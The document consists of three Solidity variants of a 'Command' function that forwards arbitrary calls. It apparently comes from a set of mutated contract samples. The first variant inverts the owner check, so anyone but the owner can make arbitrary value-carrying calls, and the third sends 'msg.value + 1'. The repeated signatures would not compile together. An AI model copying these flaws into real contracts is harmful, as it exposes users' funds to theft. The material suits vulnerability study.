function Command(address adr,bytes memory data)
payable
public
{
    require(msg.sender != Owner);

    adr.call{value: msg.value}(data);
}

function Command(address adr,bytes memory data)
payable
public
{
    require(msg.sender == Owner);

    adr.call{value: 0}(data);
}

function Command(address adr,bytes memory data)
payable
public
{
    require(msg.sender == Owner);

    adr.call{value: msg.value + 1}(data);
}
